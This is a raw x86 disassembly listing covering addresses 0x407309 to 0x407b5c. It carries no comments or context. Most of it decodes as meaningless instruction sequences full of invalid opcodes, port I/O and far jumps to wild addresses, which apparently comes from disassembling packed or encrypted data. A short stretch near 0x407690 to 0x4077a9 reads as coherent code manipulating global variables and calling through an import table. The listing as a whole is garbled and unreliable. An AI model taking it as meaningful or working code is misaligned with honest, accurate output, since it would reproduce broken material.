  407309:	pop    es
  40730a:	lock aam 0xaf
  40730d:	ds aaa 
  40730f:	adc    ebx,0x5d86b7e7
  407315:	cmp    al,0x64
  407317:	into   
  407318:	test   al,0xd4
  40731a:	sub    dl,BYTE PTR [esi-0x3e61ab6b]
  407320:	outs   dx,BYTE PTR ds:[esi]
  407321:	cdq    
  407322:	sub    ch,BYTE PTR [edx+0x60]
  407325:	xor    al,0xbb
  407327:	retf   0x396
  40732a:	seto   bl
  40732d:	(bad)  
  40732e:	mov    eax,0xb5c5d6e7
  407333:	jmp    0x407316
  407335:	adc    ah,BYTE PTR [eax+0x4d]
  407338:	arpl   WORD PTR [ecx-0x3a],si
  40733b:	test   BYTE PTR [edx+0x3643a756],bh
  407341:	mov    ecx,0xc5342bc5
  407346:	inc    ebp
  407347:	inc    eax
  407348:	adc    DWORD PTR [ebp-0x54],ecx
  40734b:	(bad)
  40734e:	scas   al,BYTE PTR es:[edi]
  40734f:	inc    edx
  407350:	xchg   esi,eax
  407351:	dec    ebx
  407352:	jecxz  0x40735c
  407354:	xchg   edi,eax
  407355:	repnz gs and eax,ebp
  407359:	scas   eax,DWORD PTR es:[edi]
  40735a:	jnp    0x407303
  40735c:	mov    esp,0x56cf3d5e
  407361:	adc    al,0x96
  407363:	mov    esp,0x187a6755
  407368:	mov    eax,0xf3ee5ebd
  40736d:	xor    edi,0x6c513623
  407373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407374:	rcr    DWORD PTR ds:0xe49e1167,1
  40737a:	repnz loop 0x4073c9
  40737d:	fdivr  DWORD PTR [esi-0x2084ac9c]
  407383:	fisubr WORD PTR [esi]
  407385:	and    al,0xec
  407387:	out    0x6d,eax
  407389:	push   ebp
  40738a:	enter  0x37c1,0x65
  40738e:	inc    eax
  40738f:	sti    
  407390:	(bad)  
  407391:	and    bl,bl
  407393:	test   eax,0xac56a3e
  407398:	js     0x407415
  40739a:	fsubr  QWORD PTR [esi-0x31]
  40739d:	adc    DWORD PTR [eax-0x62],ecx
  4073a0:	std    
  4073a1:	cmp    eax,0x65cc009e
  4073a6:	jecxz  0x407417
  4073a8:	ret    0x9dbd
  4073ab:	icebp  
  4073ac:	xchg   esi,eax
  4073ad:	ss xchg edi,eax
  4073af:	or     DWORD PTR [ecx+0xf],edi
  4073b2:	adc    eax,0x8e058a0a
  4073b7:	cwde   
  4073b8:	and    BYTE PTR [eax-0x5d],bh
  4073bb:	shr    DWORD PTR [eax],0x87
  4073be:	iret   
  4073bf:	mov    cl,0x7a
  4073c1:	inc    edi
  4073c2:	sbb    eax,0xcb908c31
  4073c7:	inc    esp
  4073c8:	ret    
  4073c9:	(bad)  
  4073ca:	fisttp QWORD PTR [ebx]
  4073cc:	cmp    edi,ebx
  4073ce:	sbb    DWORD PTR [ecx-0x16],edx
  4073d1:	aas    
  4073d2:	mov    fs,WORD PTR [ebp-0x6630052f]
  4073d8:	jmp    0x9d0:0xa098327a
  4073df:	pop    edx
  4073e0:	stos   DWORD PTR es:[edi],eax
  4073e1:	pop    edi
  4073e2:	mov    DWORD PTR [ebx-0x6102fa34],ecx
  4073e8:	mov    dl,cl
  4073ea:	xchg   ebp,eax
  4073eb:	mov    dl,0x9a
  4073ed:	ins    DWORD PTR es:[edi],dx
  4073ee:	fcmovu st,st(7)
  4073f0:	nop
  4073f1:	sti    
  4073f2:	xchg   edi,eax
  4073f3:	pop    edi
  4073f4:	jnp    0x407445
  4073f6:	fisttp DWORD PTR [ecx+0x45c7c062]
  4073fc:	pop    esi
  4073fd:	and    al,0x1b
  4073ff:	add    BYTE PTR [ecx-0x10],bl
  407402:	push   bp
  407404:	jecxz  0x4073a8
  407406:	fucom  st(6)
  407408:	jmp    DWORD PTR [edx-0x214e7186]
  40740e:	cmp    bh,BYTE PTR [eax]
  407410:	or     DWORD PTR [esi+0x31bd679a],0xb3fe97a4
  40741a:	inc    ebp
  40741b:	into   
  40741c:	push   eax
  40741d:	jae    0x4073f6
  40741f:	aas    
  407420:	pop    ebx
  407421:	push   cs
  407422:	adc    ebp,esp
  407424:	add    eax,0x2bcd5bde
  407429:	jle    0x4073bc
  40742b:	pop    edx
  40742c:	inc    esp
  40742d:	jo     0x407469
  40742f:	fndisi(8087 only) 
  407431:	in     eax,dx
  407432:	pop    edi
  407433:	sar    DWORD PTR [eax+0x70d41b21],cl
  407439:	and    al,0xda
  40743b:	sbb    ebx,DWORD PTR [eax]
  40743d:	shr    DWORD PTR [ecx+0x456773d1],cl
  407443:	loop   0x40748e
  407445:	aaa    
  407446:	or     ebx,0xca9a5129
  40744c:	fldcw  WORD PTR [eax+0x248bd1f4]
  407452:	iret   
  407453:	add    BYTE PTR [eax-0x6e0800cb],bl
  407459:	and    DWORD PTR [eax+0x71],esi
  40745c:	rcr    BYTE PTR [esp+edx*2-0x9ac89b8],cl
  407463:	and    al,BYTE PTR [esi+0x60aa70f3]
  407469:	mov    esp,0x1c4a41f5
  40746e:	scas   eax,DWORD PTR es:[edi]
  40746f:	pop    ss
  407470:	aaa    
  407471:	lods   eax,DWORD PTR ds:[esi]
  407472:	sbb    al,0x65
  407474:	xor    cl,BYTE PTR [ebx-0x6ceceaaf]
  40747a:	mov    bh,BYTE PTR [eax]
  40747c:	and    ah,BYTE PTR [edx-0x54]
  40747f:	(bad)  
  407480:	fwait
  407481:	jnp    0x4074ef
  407483:	cmp    dh,ah
  407485:	jb     0x4074f0
  407487:	mov    bl,0x25
  407489:	xor    dh,cl
  40748b:	mov    al,ds:0x1d8ca5e4
  407490:	xchg   ebx,eax
  407491:	fucom  st(2)
  407493:	into   
  407494:	xchg   ecx,ebx
  407496:	jno    0x407482
  407498:	mov    ebp,0x2555280
  40749d:	xor    ebx,DWORD PTR [ebx]
  40749f:	or     al,0x60
  4074a1:	sbb    ebp,0xffffff92
  4074a4:	in     al,dx
  4074a5:	xchg   ebx,eax
  4074a6:	sbb    DWORD PTR [edx-0x67527f50],ecx
  4074ac:	into   
  4074ad:	jle    0x4074ef
  4074af:	inc    edi
  4074b0:	jnp    0x40744b
  4074b2:	mov    ebp,esi
  4074b4:	xchg   ecx,eax
  4074b5:	and    al,0x28
  4074b7:	enter  0x8af7,0x27
  4074bb:	sub    al,0x56
  4074bd:	ret    0x90f7
  4074c0:	retf   
  4074c1:	or     eax,0xe17396c9
  4074c6:	out    dx,al
  4074c7:	or     ch,cl
  4074c9:	jbe    0x407472
  4074cb:	lods   al,BYTE PTR ds:[esi]
  4074cc:	jno    0x40745c
  4074ce:	arpl   cx,bx
  4074d0:	repnz or BYTE PTR cs:[esi+0x1b16434d],ch
  4074d8:	sub    DWORD PTR [ecx],eax
  4074da:	mov    ah,0xad
  4074dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074dd:	and    eax,DWORD PTR [ebp+0x1e]
  4074e0:	scas   al,BYTE PTR es:[edi]
  4074e1:	jne    0x407543
  4074e3:	xchg   esp,eax
  4074e4:	mov    BYTE PTR [edi+edi*4-0x28c27d2c],bl
  4074eb:	(bad)  
  4074ed:	or     DWORD PTR [eax+ecx*8-0x64],ecx
  4074f1:	or     DWORD PTR [esi],ebp
  4074f3:	and    bh,BYTE PTR [ecx]
  4074f5:	lods   eax,DWORD PTR ds:[esi]
  4074f6:	scas   al,BYTE PTR es:[edi]
  4074f7:	jle    0x4074fe
  4074f9:	dec    edx
  4074fa:	imul   edi,DWORD PTR [ebp-0x1278760],0x62f0ba2f
  407504:	inc    edx
  407505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407506:	hlt    
  407507:	cs scas eax,DWORD PTR es:[edi]
  407509:	cmp    BYTE PTR [esp+ecx*8],bh
  40750c:	xchg   ebx,eax
  40750d:	cmc    
  40750e:	mov    ah,0x18
  407510:	fwait
  407511:	jge    0x407511
  407513:	or     eax,0x40d05bf1
  407518:	out    dx,al
  407519:	xchg   ebp,eax
  40751a:	cmp    BYTE PTR [ecx+0x61],bl
  40751d:	adc    DWORD PTR [eax-0x564f52e4],edi
  407523:	pop    esi
  407524:	int    0x90
  407526:	mov    ds:0x3260bbb4,eax
  40752b:	sbb    ah,BYTE PTR ds:0x60965cd7
  407531:	loopne 0x4074ec
  407533:	mov    eax,ds:0x5f4e791e
  407538:	mov    ebp,0xc13ff4e5
  40753d:	ror    edi,0xe3
  407540:	mov    al,BYTE PTR [edi]
  407542:	fisttp WORD PTR [eax+esi*8+0x6d18e421]
  407549:	retf   
  40754a:	mov    WORD PTR [edi],cs
  40754c:	mov    ch,dh
  40754e:	inc    esp
  40754f:	add    DWORD PTR [edx+edi*2+0x4c],eax
  407553:	sub    dl,BYTE PTR [edx+0x4afae6a2]
  407559:	cmp    DWORD PTR gs:0x8e3aedf6,esp
  407560:	pop    esp
  407561:	xor    eax,0xc05fc647
  407566:	pop    ebp
  407567:	xchg   edx,eax
  407568:	cmp    al,BYTE PTR [esi]
  40756a:	iret   
  40756b:	pop    esi
  40756c:	rol    edi,0x6f
  40756f:	inc    edx
  407570:	clc    
  407571:	dec    cx
  407573:	sub    BYTE PTR [esi-0x7],dh
  407576:	push   ebx
  407577:	daa    
  407578:	push   esp
  407579:	idiv   edx
  40757b:	call   0xc59e:0x26306656
  407582:	in     al,dx
  407583:	cld    
  407584:	cld    
  407585:	add    BYTE PTR [ebx-0x56],bh
  407588:	(bad)  
  407589:	fs into 
  40758b:	cmp    eax,DWORD PTR [edx]
  40758d:	add    esp,DWORD PTR [ecx]
  40758f:	mov    dh,0x7b
  407591:	add    al,0xf1
  407593:	or     BYTE PTR [edi-0x10],dl
  407596:	xlat   BYTE PTR ds:[ebx]
  407597:	call   0x4b796561
  40759c:	lahf   
  40759d:	dec    ebx
  40759e:	adc    eax,DWORD PTR [edi+0x6dfeafba]
  4075a4:	psubusw mm6,QWORD PTR [edi-0x3f]
  4075a8:	xor    DWORD PTR [edx+0x29d235a8],ebx
  4075ae:	cmc    
  4075af:	adc    DWORD PTR [ebp-0x7e],eax
  4075b2:	push   cs
  4075b3:	push   edx
  4075b4:	js     0x40754d
  4075b6:	arpl   WORD PTR [eax-0xf],di
  4075b9:	pop    edi
  4075ba:	adc    dh,0xf0
  4075bd:	cmp    bh,BYTE PTR [edi-0xd7bb10d]
  4075c3:	out    dx,al
  4075c4:	push   ecx
  4075c5:	arpl   WORD PTR [ecx],di
  4075c7:	paddusb mm1,QWORD PTR [esi+0x68]
  4075cb:	pop    eax
  4075cc:	cmp    esp,edx
  4075ce:	mov    DWORD PTR [eax+0x1f2f69e4],eax
  4075d4:	ds cwde 
  4075d6:	jno    0x4075d4
  4075d8:	sbb    bl,BYTE PTR [edi+0x9]
  4075db:	es popa 
  4075dd:	ja     0x4075dd
  4075df:	fmul   DWORD PTR [ecx+ebp*1]
  4075e2:	xchg   ecx,eax
  4075e3:	add    ch,dh
  4075e5:	inc    esi
  4075e6:	rcl    ch,cl
  4075e8:	mov    ecx,0x1d5d6121
  4075ed:	fistp  QWORD PTR [eax+0x565ba0fb]
  4075f3:	xchg   esi,eax
  4075f4:	push   ebp
  4075f5:	dec    BYTE PTR [esi+ebp*8+0x59]
  4075f9:	jmp    0x6aef6fb6
  4075fe:	fsub   st,st(7)
  407600:	or     al,0x55
  407602:	adc    esp,DWORD PTR gs:[edi+0x4aa4f03d]
  407609:	xor    DWORD PTR [ebp-0x4af6f667],esp
  40760f:	test   BYTE PTR [edx],bh
  407611:	lock inc esi
  407613:	jb     0x40763d
  407615:	sub    eax,0x4e60145b
  40761a:	pop    ebp
  40761b:	mov    al,ds:0xd3af69b5
  407620:	dec    edi
  407621:	add    bl,al
  407623:	hlt    
  407624:	sbb    eax,0x79062ef6
  407629:	push   edx
  40762a:	xchg   esp,eax
  40762b:	jns    0x4076a5
  40762d:	dec    ecx
  40762e:	pushf  
  40762f:	xor    eax,0x123d4a8e
  407634:	gs add esi,eax
  407637:	out    dx,al
  407638:	jmp    0x5bc7:0x822888ec
  40763f:	mov    ds:0x8c91cfa1,al
  407644:	push   ebp
  407645:	sub    DWORD PTR [edx-0x5fef8453],edi
  40764b:	cs dec edx
  40764d:	pop    edi
  40764e:	jb     0x407680
  407650:	push   esi
  407651:	clc    
  407652:	xor    esi,DWORD PTR [edi-0x6]
  407655:	pop    eax
  407656:	clc    
  407657:	jae    0x4076b7
  407659:	loope  0x40764f
  40765b:	push   ss
  40765c:	dec    edi
  40765d:	mov    edi,0xd76f93cb
  407663:	inc    esi
  407664:	mov    esp,0x9df7938e
  407669:	jbe    0x4076b1
  40766b:	jnp    0x407647
  40766d:	mov    bl,0xd7
  40766f:	mov    ebp,0x678e5942
  407674:	mov    bl,0x84
  407676:	or     dh,ch
  407678:	add    al,0xef
  40767a:	or     ecx,DWORD PTR [eax]
  40767c:	jne    0x40764b
  40767e:	sbb    edi,DWORD PTR [esi+0x59d62693]
  407684:	test   DWORD PTR [edi-0x3e],edx
  407687:	xor    BYTE PTR [eax-0x53f14a6c],ch
  40768d:	ja     0x407659
  40768f:	outs   dx,BYTE PTR ds:[esi]
  407690:	mov    ebx,0xea7d5d00
  407695:	adc    eax,0x2eac12e
  40769a:	mov    DWORD PTR [ebp-0x1c],ecx
  40769d:	mov    ecx,DWORD PTR [ebp+0x18]
  4076a0:	sub    DWORD PTR ds:0x4229a6,0x425a
  4076aa:	mov    edx,DWORD PTR [ebp+0x1c]
  4076ad:	or     DWORD PTR ds:0x4228da,0x210e
  4076b7:	xor    DWORD PTR [ebp-0x1c],edi
  4076ba:	or     DWORD PTR ds:0x422962,0x4229ce
  4076c4:	xor    edx,edx
  4076c6:	or     edx,DWORD PTR [ebp-0x1c]
  4076c9:	or     DWORD PTR ds:0x4228ce,0x4229c2
  4076d3:	shl    ecx,0x1e
  4076d6:	dec    DWORD PTR ds:0x4228f2
  4076dc:	add    edx,DWORD PTR [ebp-0x2c]
  4076df:	add    DWORD PTR [eax],edx
  4076e1:	sbb    eax,0x3637
  4076e6:	mov    eax,DWORD PTR [esi]
  4076e8:	sub    DWORD PTR ds:0x42292a,ebx
  4076ee:	mov    ecx,DWORD PTR [esi+0x4]
  4076f1:	movzx  edx,BYTE PTR ds:0x42290a
  4076f8:	sub    edx,DWORD PTR ds:0x42292e
  4076fe:	mov    DWORD PTR ds:0x42290a,edx
  407704:	shrd   eax,ecx,0x2
  407708:	shr    ecx,0x2
  40770b:	sub    edx,edx
  40770d:	mov    ecx,DWORD PTR [esi]
  40770f:	cmp    DWORD PTR ds:0x422956,0x0
  407716:	mov    DWORD PTR ds:0x422992,0x518b
  407720:	mov    edx,DWORD PTR ds:0x4228ee
  407726:	mov    DWORD PTR ds:0x4229b6,0x962
  407730:	jmp    0x40778a
  407735:	mov    DWORD PTR ds:0x422992,0x300f
  40773f:	mov    DWORD PTR ds:0x42296a,0xfe3
  407749:	jne    0x407770
  40774f:	push   0x0
  407751:	push   0x5aa3
  407756:	push   0x671f
  40775b:	push   DWORD PTR [ebp-0x10]
  40775e:	call   DWORD PTR ds:0x42a178
  407764:	and    DWORD PTR ds:0x42296a,ecx
  40776a:	sub    edx,0x694d
  407770:	inc    edx
  407771:	adc    DWORD PTR ds:0x4228be,0x1a32
  40777b:	dec    edx
  40777c:	mov    edx,DWORD PTR ds:0x4229fe
  407782:	mov    edx,DWORD PTR [edx]
  407784:	xor    DWORD PTR ds:0x422922,edx
  40778a:	mov    edx,DWORD PTR [esi+0x4]
  40778d:	xor    eax,edi
  40778f:	shl    ecx,0x1e
  407792:	xor    edx,edx
  407794:	or     edx,eax
  407796:	xor    eax,eax
  407798:	add    eax,DWORD PTR ds:0x4229c2
  40779e:	adc    eax,DWORD PTR ds:0x42298e
  4077a4:	mov    ds:0x4229c2,eax
  4077a9:	jmp    0x407d33
  4077ae:	jle    0x407760
  4077b0:	fucomp st(4)
  4077b2:	sbb    DWORD PTR [eax-0x7c58e782],esp
  4077b8:	test   BYTE PTR [edx+0x744c342a],dh
  4077be:	mul    DWORD PTR [ebx+0x16]
  4077c1:	push   ss
  4077c2:	cmp    eax,0x63161604
  4077c7:	mov    ebp,0x32efef4d
  4077cc:	cwde   
  4077cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077ce:	sbb    al,0xd2
  4077d0:	ds mov dl,0xc0
  4077d3:	inc    eax
  4077d4:	(bad)  
  4077d5:	xchg   edi,eax
  4077d6:	call   0xa969a43f
  4077db:	popa   
  4077dc:	jp     0x407762
  4077de:	(bad)  
  4077df:	test   eax,0xd37b123d
  4077e4:	mov    ebp,0x1fbd6a05
  4077e9:	pop    esp
  4077ea:	int3   
  4077eb:	sbb    al,0xe5
  4077ed:	fiadd  WORD PTR [eax+0x154db357]
  4077f3:	cmp    al,0x4d
  4077f5:	mov    dl,0xa
  4077f7:	pop    ebx
  4077f8:	pusha  
  4077f9:	adc    DWORD PTR [ebp+0x49],0x3c
  4077fd:	mov    cl,cl
  4077ff:	adc    ebx,DWORD PTR [ecx+esi*2+0x7c4a5f4]
  407806:	inc    ebp
  407807:	inc    ecx
  407808:	sbb    DWORD PTR [eax-0x667e79ea],ebx
  40780e:	icebp  
  40780f:	xchg   esi,eax
  407810:	pop    edx
  407811:	and    DWORD PTR [ecx],edx
  407813:	mov    BYTE PTR [ebx],al
  407815:	cmc    
  407816:	push   ds
  407817:	pop    ebp
  407818:	hlt    
  407819:	(bad)  
  40781a:	inc    ecx
  40781b:	aad    0x5f
  40781d:	jmp    0x244fdbec
  407822:	push   ss
  407823:	mov    cl,0x46
  407825:	aaa    
  407826:	jmp    0x839e:0x4ce5d387
  40782d:	adc    BYTE PTR [eax],cl
  40782f:	lea    edi,[edx-0x71]
  407832:	jo     0x407815
  407834:	sub    eax,DWORD PTR [ecx+0x7b9d057b]
  40783a:	add    dh,BYTE PTR [ebx]
  40783c:	lods   eax,DWORD PTR ds:[esi]
  40783d:	mov    dl,0x68
  40783f:	pop    ebx
  407840:	rol    DWORD PTR [edi+0x684e8f7b],cl
  407846:	in     al,dx
  407847:	aas    
  407848:	or     ebx,esi
  40784a:	cwde   
  40784b:	dec    ebx
  40784c:	sub    ecx,DWORD PTR [ebx+0x1488fd29]
  407852:	sub    DWORD PTR [ecx],edi
  407854:	xor    BYTE PTR [esi-0x7a],al
  407857:	(bad)  
  407858:	(bad)  
  40785a:	pop    eax
  40785b:	test   eax,0xab4b669d
  407860:	bound  ebx,QWORD PTR [esi+eax*8]
  407863:	bound  eax,QWORD PTR [ebx]
  407865:	or     al,0x89
  407867:	iret   
  407868:	retf   
  407869:	lea    esi,[ebx-0xa3b4e97]
  40786f:	sbb    eax,0xad02c4db
  407874:	dec    ebx
  407875:	xor    ebp,ecx
  407877:	ins    BYTE PTR es:[edi],dx
  407878:	cmp    ecx,DWORD PTR [eax-0x37]
  40787b:	cwde   
  40787c:	clc    
  40787d:	dec    ecx
  40787e:	and    BYTE PTR [ebx-0x7e],dl
  407881:	dec    esi
  407882:	ss push 0x1f11b232
  407888:	jne    0x40789e
  40788a:	xchg   BYTE PTR [esi+ecx*4],bh
  40788d:	xchg   ebp,eax
  40788e:	jbe    0x4078e5
  407890:	push   ecx
  407891:	stos   DWORD PTR es:[edi],eax
  407892:	jo     0x407850
  407894:	js     0x407820
  407896:	out    dx,al
  407897:	mov    ch,ah
  407899:	or     ch,BYTE PTR ds:[ecx+0x26c84fa3]
  4078a0:	cmp    DWORD PTR [esi+0x14],ecx
  4078a3:	and    DWORD PTR [esi-0x114bd231],0xffffff92
  4078aa:	cmp    eax,0xe6bd451
  4078af:	sbb    eax,0x4d19019
  4078b4:	fbld   TBYTE PTR [ecx+0x58a6ffac]
  4078ba:	pop    ss
  4078bb:	jl     0x40791f
  4078bd:	ins    DWORD PTR es:[edi],dx
  4078be:	fbstp  TBYTE PTR [esp+edx*2]
  4078c1:	mov    al,0xe1
  4078c3:	adc    esi,DWORD PTR [edx-0x43714e0a]
  4078c9:	clc    
  4078ca:	xchg   ebp,eax
  4078cb:	hlt    
  4078cc:	fwait
  4078cd:	push   0x3410d7f8
  4078d2:	outs   dx,DWORD PTR ds:[esi]
  4078d3:	cmp    eax,esp
  4078d5:	mov    dl,0xf
  4078d7:	ds das 
  4078d9:	mov    WORD PTR [edi+0x37b0d357],ss
  4078df:	test   al,0x6b
  4078e1:	jp     0x40795b
  4078e3:	add    BYTE PTR [ecx-0x6f],al
  4078e6:	lods   eax,DWORD PTR ds:[esi]
  4078e7:	adc    ebp,0x83a4c620
  4078ed:	xchg   esi,esp
  4078ef:	mov    dl,0x75
  4078f1:	loopne 0x40795f
  4078f3:	dec    edx
  4078f4:	xchg   ebp,eax
  4078f5:	mov    dh,0xa1
  4078f7:	jo     0x40793a
  4078f9:	loope  0x407910
  4078fb:	inc    bp
  4078fd:	inc    edi
  4078fe:	data16 jmp 0x40794c
  407901:	sub    al,dh
  407903:	iret   
  407904:	xchg   edi,eax
  407905:	jns    0x40797d
  407907:	push   eax
  407908:	adc    al,0xaf
  40790a:	pusha  
  40790b:	or     ecx,0x2fba410f
  407911:	mov    bl,0xb5
  407913:	mov    ebx,0x3d000471
  407918:	adc    al,0xd5
  40791a:	dec    esi
  40791b:	in     al,0x38
  40791d:	test   ah,0xaa
  407920:	scas   eax,DWORD PTR es:[edi]
  407921:	int    0xa3
  407923:	(bad)  
  407924:	fsub   QWORD PTR [ebp+0x43252458]
  40792a:	loope  0x407903
  40792c:	cmp    al,0xe2
  40792e:	div    BYTE PTR [edi]
  407930:	and    BYTE PTR [ebp-0x58],cl
  407933:	push   edx
  407934:	mov    ds:0x189b5029,eax
  407939:	pop    ds
  40793a:	cld    
  40793b:	sti    
  40793c:	sbb    dl,BYTE PTR [eax+edi*4+0x6d]
  407940:	jbe    0x4078f6
  407942:	or     al,0x13
  407944:	mov    dh,0x82
  407946:	lds    ebp,FWORD PTR [eax]
  407948:	div    BYTE PTR [edi]
  40794a:	icebp  
  40794b:	call   0xf980b52f
  407950:	adc    eax,0x70a09f4b
  407955:	into   
  407956:	(bad)  [edi]
  407958:	mov    ecx,0x413301ba
  40795d:	jp     0x407976
  40795f:	ret    0x3cb1
  407962:	retf   0xe401
  407965:	iret   
  407966:	mov    ah,0xbe
  407968:	pop    esp
  407969:	sbb    ecx,DWORD PTR [esi-0x4f146394]
  40796f:	rcl    DWORD PTR [edx-0x13],1
  407972:	mov    ds:0x62ca2f3d,al
  407977:	call   0x86d8:0xaa0f7261
  40797e:	jmp    0x454efcc6
  407983:	push   es
  407984:	mov    al,0xbd
  407986:	(bad)  
  407987:	mov    ds:0x92720218,al
  40798c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40798d:	jne    0x40791a
  40798f:	cdq    
  407990:	mov    ebp,0xd3432432
  407995:	stos   BYTE PTR es:[edi],al
  407996:	cmc    
  407997:	shl    edi,cl
  407999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40799a:	push   cs
  40799b:	mov    bl,0xbd
  40799d:	push   ss
  40799e:	xchg   bh,dl
  4079a0:	or     DWORD PTR [edx+0x5d],esi
  4079a3:	(bad)
  4079a7:	ja     0x4079b6
  4079a9:	adc    ecx,edi
  4079ab:	(bad)  
  4079ac:	stc    
  4079ad:	mov    al,0xd5
  4079af:	or     edx,DWORD PTR [ebp+0x3d27246d]
  4079b5:	lahf   
  4079b6:	retf   
  4079b7:	sub    ecx,eax
  4079b9:	cli    
  4079ba:	push   0x49821ddb
  4079bf:	jbe    0x407a0e
  4079c1:	scas   al,BYTE PTR es:[edi]
  4079c2:	push   0x2a3ff788
  4079c7:	shl    DWORD PTR [ebx-0x59],1
  4079ca:	adc    eax,0x7114bc9c
  4079cf:	mov    ah,bh
  4079d1:	sahf   
  4079d2:	ss int 0x58
  4079d5:	push   cs
  4079d6:	mov    ds:0x750a31b4,al
  4079db:	or     eax,0x410b1683
  4079e0:	mov    ebp,0xad30bc49
  4079e5:	pop    ebp
  4079e6:	jne    0x40797e
  4079e8:	adc    DWORD PTR [eax-0x74af8dd8],ecx
  4079ee:	shl    DWORD PTR [ecx+edi*4-0x73],1
  4079f2:	or     BYTE PTR [edx],0x27
  4079f5:	add    DWORD PTR [ecx-0x79b35699],edi
  4079fb:	retf   
  4079fc:	(bad)  
  4079fd:	loope  0x407a3f
  4079ff:	popf   
  407a00:	idiv   BYTE PTR [edx+0x486626d2]
  407a06:	call   FWORD PTR [ecx+edi*2-0x64b81988]
  407a0d:	outs   dx,DWORD PTR ds:[esi]
  407a0e:	pop    edx
  407a0f:	and    al,0x7d
  407a11:	jo     0x4079a0
  407a13:	xor    edx,DWORD PTR [eax]
  407a15:	call   0x202:0xdddc608
  407a1c:	test   DWORD PTR [ecx-0x73],esi
  407a1f:	or     ch,bh
  407a21:	in     eax,dx
  407a22:	popa   
  407a23:	sub    eax,0xc27f1655
  407a28:	hlt    
  407a29:	aas    
  407a2a:	sub    DWORD PTR [edi+0xdb33749],0x138ea45
  407a34:	pushf  
  407a35:	pop    eax
  407a36:	scas   eax,DWORD PTR es:[edi]
  407a37:	xlat   BYTE PTR ds:[ebx]
  407a38:	mov    eax,ds:0x564ae2e8
  407a3d:	out    dx,eax
  407a3e:	inc    eax
  407a3f:	cmp    ah,ch
  407a41:	lods   al,BYTE PTR ds:[esi]
  407a42:	add    ebp,DWORD PTR [ebp-0x2f]
  407a45:	test   eax,0xd808166d
  407a4a:	mov    bl,0x6
  407a4c:	sbb    DWORD PTR [ebp-0x80],eax
  407a4f:	es jo  0x407ac0
  407a52:	retf   0xb120
  407a55:	ja     0x407a8c
  407a57:	xchg   esi,eax
  407a58:	pushf  
  407a59:	mov    WORD PTR [ecx+0xc],?
  407a5c:	(bad)  
  407a5d:	cmp    al,0x32
  407a5f:	xor    al,0xea
  407a61:	xor    ebp,edx
  407a63:	cli    
  407a64:	xchg   esp,eax
  407a65:	call   0xc019bf6f
  407a6a:	dec    esp
  407a6b:	push   eax
  407a6c:	mov    cl,0x86
  407a6e:	push   esi
  407a6f:	pop    ebx
  407a70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a72:	jp     0x407a2f
  407a74:	lds    ebx,FWORD PTR [eax-0x73]
  407a77:	jp     0x407aa7
  407a79:	imul   ebp,DWORD PTR [edx],0xffffffdd
  407a7c:	xor    al,0xa9
  407a7e:	cmp    edi,DWORD PTR [ecx-0x28]
  407a81:	jle    0x407a76
  407a83:	sub    al,0x84
  407a85:	popf   
  407a86:	retf   0x15c8
  407a89:	cld    
  407a8a:	xchg   ecx,eax
  407a8b:	retf   
  407a8c:	std    
  407a8d:	(bad)  
  407a8e:	into   
  407a8f:	add    ecx,edi
  407a91:	(bad)  
  407a92:	in     eax,dx
  407a93:	xchg   esi,eax
  407a94:	add    edi,DWORD PTR [edx+0x50f39b74]
  407a9a:	fdiv   st(0),st
  407a9c:	das    
  407a9d:	mov    edi,0xac57f2db
  407aa2:	cmp    eax,0xb5aefc41
  407aa7:	inc    ebx
  407aa8:	stc    
  407aa9:	ins    BYTE PTR es:[edi],dx
  407aaa:	inc    ebp
  407aab:	je     0x407ace
  407aad:	shr    DWORD PTR [esi+0x20ee244e],0xc8
  407ab4:	and    DWORD PTR [eax+0x632f2327],ebp
  407aba:	cdq    
  407abb:	(bad)  
  407abc:	stos   BYTE PTR es:[edi],al
  407abd:	inc    ecx
  407abe:	dec    ecx
  407abf:	retf   0x4d6f
  407ac2:	push   esi
  407ac3:	and    eax,0x898a1b2a
  407ac8:	adc    DWORD PTR [ebx],0x873a5515
  407ace:	mov    ebp,fs
  407ad0:	daa    
  407ad1:	mov    WORD PTR [edx+eax*2+0x3c],?
  407ad5:	push   ebp
  407ad6:	shl    DWORD PTR [eax-0xf2946f5],1
  407adc:	add    BYTE PTR [edx-0xc],bl
  407adf:	xor    dh,bl
  407ae1:	es inc esp
  407ae3:	cdq    
  407ae4:	sub    DWORD PTR [ecx-0x419990c8],0xffffffff
  407aeb:	cs nop
  407aed:	loopne 0x407aba
  407aef:	mov    esi,0x440834ed
  407af4:	or     dl,BYTE PTR [edx-0x1098d105]
  407afa:	mov    dh,0xf0
  407afc:	sub    al,BYTE PTR [edi]
  407afe:	inc    edi
  407aff:	pop    ebp
  407b00:	arpl   si,ax
  407b02:	lds    ebx,FWORD PTR [eax]
  407b04:	add    eax,0xf8583745
  407b09:	popa   
  407b0a:	ins    DWORD PTR es:[edi],dx
  407b0b:	push   eax
  407b0c:	out    dx,al
  407b0d:	gs (bad) 
  407b11:	cwde   
  407b12:	add    cl,BYTE PTR [edx]
  407b14:	dec    esp
  407b15:	ss mov bh,0x39
  407b18:	inc    esi
  407b19:	mov    ds:0xb455be93,al
  407b1e:	add    bh,BYTE PTR [esi-0x43a96d5]
  407b24:	(bad)  
  407b25:	pop    esi
  407b26:	icebp  
  407b27:	sbb    DWORD PTR [edi],esi
  407b29:	pusha  
  407b2a:	sub    eax,0xad9cb439
  407b2f:	jno    0x407ba3
  407b31:	out    dx,eax
  407b32:	js     0x407adc
  407b34:	or     al,0x77
  407b36:	xor    al,ch
  407b38:	enter  0x26d9,0xd5
  407b3c:	jecxz  0x407bb3
  407b3e:	ins    DWORD PTR es:[edi],dx
  407b3f:	fld    TBYTE PTR [ebx+ebp*1]
  407b42:	outs   dx,DWORD PTR ds:[esi]
  407b43:	mov    bl,0x62
  407b45:	or     DWORD PTR [eax+0x38],ecx
  407b48:	ret    
  407b49:	add    BYTE PTR [edi],al
  407b4b:	mov    al,ds:0xddd40fe3
  407b50:	add    esi,DWORD PTR [ecx]
  407b52:	pop    eax
  407b53:	mov    eax,ds:0xb0fbe970
  407b58:	adc    bh,BYTE PTR [edi-0x49]
  407b5b:	stos   DWORD PTR es:[edi],eax
  407b5c:	sbb    esi,DWORD PTR [eax+0x2b]
